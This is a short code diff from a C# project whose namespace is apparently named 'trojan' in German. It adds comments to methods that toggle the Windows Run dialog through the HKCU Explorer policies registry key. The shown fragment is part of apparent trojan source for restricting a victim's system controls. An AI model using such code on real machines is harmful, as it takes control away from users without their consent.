@@ -4,6 +4,9 @@ namespace DNAV_Trojaner
 {
     class Run
     {
+        /// <summary>
+        /// Aktiviert den Ausführen Dialog
+        /// </summary>
         public static void Enable()
         {
             RegistryKey run = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
@@ -13,6 +16,9 @@ namespace DNAV_Trojaner
             }
         }
 
+        /// <summary>
+        /// Deaktiviert den Ausführen Dialog
+        /// </summary>
         public static void Disbable()
         {
             RegistryKey run = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
